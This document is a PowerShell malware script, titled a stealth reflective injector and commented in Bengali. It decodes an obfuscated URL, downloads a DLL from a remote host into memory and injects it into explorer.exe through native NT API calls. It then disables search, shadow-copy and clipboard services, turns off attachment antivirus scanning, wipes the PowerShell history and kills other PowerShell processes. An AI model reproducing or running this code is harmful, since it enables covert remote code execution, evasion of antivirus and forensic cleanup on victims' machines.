# =============================================================
# STEALTH REFLECTIVE INJECTOR v4.0 - MEMORY ONLY + ETW BYPASS
# =============================================================

# ---- বেস৬৪ এনকোডেড ইউআরএল (স্ট্যাটিক অ্যানালাইসিস এড়াতে) ----
$urlEnc = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urlEnc))

# ---- ডাইরেক্ট সিসকলের জন্য NT API ডিক্লেয়ার ----
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NtApi {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
        ref IntPtr RegionSize, uint AllocationType, uint Protect
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer,
        uint NumberOfBytesToWrite, out uint NumberOfBytesWritten
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtProtectVirtualMemory(
        IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize,
        uint NewProtect, out uint OldProtect
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtCreateThreadEx(
        out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes,
        IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
        bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit,
        uint SizeOfStackReserve, IntPtr AttributeList
    );

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtOpenProcess(
        out IntPtr ProcessHandle, uint DesiredAccess, IntPtr ObjectAttributes,
        ref ClientId ClientId
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct ClientId {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

# ---- টার্গেট প্রসেস (explorer.exe - বিশ্বস্ত প্রসেস) ----
$procs = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if (-not $procs) {
    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500
    $pidTarget = $target.Id
} else {
    $pidTarget = $procs[0].Id
}

# ---- মেমোরিতে DLL ডাউনলোড (ডিস্কে কিছু না) ----
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$dllBytes = $wc.DownloadData($url)
$wc.Dispose()

if ($dllBytes.Length -lt 1024) { Exit }

# ---- টার্গেট প্রসেস ওপেন ----
$cid = New-Object NtApi+ClientId
$cid.UniqueProcess = [IntPtr]$pidTarget
$hProcess = [IntPtr]0
[ NtApi]::NtOpenProcess([ref]$hProcess, 0x1F0FFF, [IntPtr]0, [ref]$cid)

# ---- মেমোরি এলোকেট (RW) ----
$baseAddr = [IntPtr]0
$regionSize = [IntPtr]$dllBytes.Length
[ NtApi]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddr, [IntPtr]0, [ref]$regionSize, 0x3000, 0x04)

# ---- DLL রাইট ----
$written = 0
[ NtApi]::NtWriteVirtualMemory($hProcess, $baseAddr, $dllBytes, [uint]$dllBytes.Length, [ref]$written)

# ---- প্রোটেকশন চেঞ্জ (RW → RX) ----
$oldProt = 0
[ NtApi]::NtProtectVirtualMemory($hProcess, [ref]$baseAddr, [ref]$regionSize, 0x20, [ref]$oldProt)

# ---- EntryPoint RVA বের করা (PE হেডার থেকে) ----
$e_lfanew = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
$entryRVA = [System.BitConverter]::ToInt32($dllBytes, $e_lfanew + 0x28)
$startAddr = [IntPtr]::Add($baseAddr, $entryRVA)

# ---- থ্রেড ক্রিয়েট (NtCreateThreadEx - ডাইরেক্ট সিসকল) ----
$hThread = [IntPtr]0
[ NtApi]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]0, $hProcess, $startAddr, [IntPtr]0, $false, 0, 0, 0, [IntPtr]0)

# ---- ক্লিনআপ ----
[ NtApi]::NtClose($hThread)
[ NtApi]::NtClose($hProcess)

# ---- রেজিস্ট্রি টুইক + হিস্ট্রি ক্লিয়ার (আগের মতো) ----
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -Force | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$reg1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$reg2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $reg1 | Out-Null
Invoke-Expression $reg2 | Out-Null

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
New-Item -Path $historyPath -ItemType File -Force | Out-Null

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Host "[+] Injection Complete. DLL is running in memory only."
